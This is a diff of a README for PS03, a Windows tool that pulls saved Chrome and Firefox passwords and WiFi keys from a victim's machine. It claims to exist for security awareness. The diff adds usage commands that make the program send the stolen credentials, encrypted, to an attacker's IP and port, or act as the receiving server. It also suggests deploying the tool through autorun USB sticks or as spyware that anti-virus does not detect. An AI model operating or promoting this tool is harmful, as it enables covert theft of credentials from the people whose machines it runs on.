@@ -2,43 +2,39 @@
 
 PS03 is a project which goal is to set more focus on security. Stop saving your passwords in chrome, firefox, don't automaticly connect to WiFi's and so on. This project shows how easy an attacker can get all your passwords ever saved, even without any anti-virus complaining. 
 
-PS03, Password Sniffer, version 3, consists of four solutions:
-
-  - PS03 Server
-  - PS03 Victim
-  - ChromeDecrypt
-  - FirefoxDecrypt
-  - WiPS
   
 
 ![ServersideScreenshot](https://github.com/benlarsendk/PS03/blob/master/screenshot.PNG "Screenshot of serverside")
-### PS03 Server
-This is the receiving end of the project. This would be the attackers machine, or a server. As for now it simply decrypt the incomming information and prints it to the console. This is a stand-alone solution and doesn't need any external libraries. 
+The above shown screenshot, is the output as seen from serverside.
 
-### PS03 Victim
-Is the client-side/victim-side of the project. It uses the two libraries to get saved Wifi-passwords as well as all saved passwords in chrome. This is also the soultion containing the logic for packing, encrypting and sending the data. **Remember to change the IP and port before using. 
+### Usage
+The software is made as both the receiving end as well as the victimside end. It's therefore required to configure the program at startup, such that it does as expected. This software could be used on a USB-stick with autorun capabilities to extract passwordsinformation from a victim. It is also possible to use it as spyware and let the program send the data (AES-encrypted) back to a host.
 
-### ChromeDecrypt
-Is a library that locates and decrypts saved passwords from google chrome. It delivers the action-url, the username and of course the password. When done, it will raise an event with the decrypted data as an eventarg.
+To configure the program as a sniffer that transmits to a server:
+```sh
+$ PS03.exe -t -i [ip] -p [port]
+```
 
-### FirefoxDecrypt
-Exactly the same as ChromeDecrypt, it just works differently.
+To configure the program as a serverside receiver:
+```sh
+$ PS03.exe -r -p [port]
+```
 
-### WiPS
-Is a library that makes use of the commandprompt to get saved WiFi-profiles, including the passwords. When done, it will raise an event with the data as an eventarg. The use of cmd wil not show any cmd-prompts on the victims machine.
-
+If wanted, the program can function without any network communication. To configure the program to run locally
+```sh
+$ PS03.exe -v
+```
+The -v (verbose) command can also be used alongside networking to generate report and show output on victimside.
 ### Credits
 
-PS03 uses code from the following authors:
+PS03 uses code and inspiration from the following authors:
 
 * [DPAPI] - For decrypting Chrome passwords
 * [Mark Brittingham] - For simple AES encryption of data
 * [SQLite] - For reading the Google Chrome Login Data file
 * [3V1L] - For supplying some of the code for decrypting firefox passwords and username.
+* [Command Line Parser Library] - for parsing input parameters
 
-
-### Note before use
-If you inted to use this software, be aware that you need to compile the libraries first, and include the .DLL's as references in the victim-side application. 
 
 ### Development
 
@@ -47,11 +43,15 @@ If you find an issue, please create it as an issue, and if you want you can fix 
 
 ### Version
 
-3.1.0
+3.2.0
 
 **CHANGELOG**
+3.2.0
+- Merged all solutions in to a single solution and added commandline parameters
+
 3.1.0
 - PS03 can now handle Firefox user profiles. Tested on Firefox version 43.0.1.
+- PS03 Generates a report file with most common passwords. This is still in pre-alpha
 
 
 3.0.2
@@ -63,5 +63,6 @@ If you find an issue, please create it as an issue, and if you want you can fix 
    [Mark Brittingham]: <http://stackoverflow.com/questions/165808/simple-two-way-encryption-for-c-sharp>
    [SQLite]: <https://www.sqlite.org/>
    [3V1L]: <http://xakfor.net/threads/c-firefox-36-password-cookie-recovery.12192/>
+   [Command Line Parser Library]: <https://commandline.codeplex.com/>
    
 
